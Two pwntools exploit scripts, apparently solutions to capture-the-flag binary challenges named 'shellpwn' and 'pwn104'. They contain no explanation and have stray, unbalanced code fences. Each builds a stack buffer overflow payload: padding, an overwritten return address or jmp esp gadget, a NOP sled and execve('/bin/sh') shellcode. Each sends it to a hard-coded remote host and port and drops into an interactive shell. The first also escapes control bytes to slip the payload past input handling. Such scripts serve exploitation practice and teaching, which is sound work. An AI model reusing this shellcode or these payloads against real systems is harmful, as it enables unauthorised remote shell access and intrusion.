

```python 
from pwn import *
import sys

# Context
context.binary = './shellpwn'
context.log_level = 'debug'

# Connection
host = '38.60.200.116'
port = 9005
p = remote(host, port)

# Gadget
jmp_esp = 0x080491c3

# Shellcode
# x86 execve("/bin/sh")
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

# Payload
offset = 76
raw_payload = b"A" * offset
raw_payload += p32(jmp_esp)
raw_payload += b"\x90" * 32  # NOP sled
raw_payload += shellcode

# Escape payload
# Use 0x16 (SYN/LNEXT) to quote control characters
payload = b""
for byte in raw_payload:
    if byte < 0x20 or byte == 0x7f:
        payload += b"\x16" + bytes([byte])
    else:
        payload += bytes([byte])

# Send
p.recvuntil(b"Submit diagnostic notes:")
p.sendline(payload)

# Interactive
p.interactive()
```


```python 

```python
from pwn import *


context.log_level = 'debug'
context.binary = "./pwn104-1644300377109.pwn104"
elf = context.binary

def start():
    if args.REMOTE:
        return remote("10.48.133.26", 9004)
    elif args.GDB:
        return gdb.debug(elf.path, gdbscript='''
            break main
            continue
        ''')
    else:
        return process(elf.path)

def exploit(p):
    
    p.recvuntil(b"for you at ")
    buffer = p.recvline().decode().strip()
    buffer = int(buffer, 16)
    shellcode = asm(shellcraft.amd64.sh())
    ret_addr = p64(buffer + 96) 
    
    # 88 bytes padding + 8 bytes return address + 16 bytes NOP sled + shellcode
    payload = b"\x90" * 88 + ret_addr + b"\x90" * 16 + shellcode
    p.sendline(payload)

    p.interactive()


if __name__ == '__main__':
    io = start()
    exploit(io)
```

```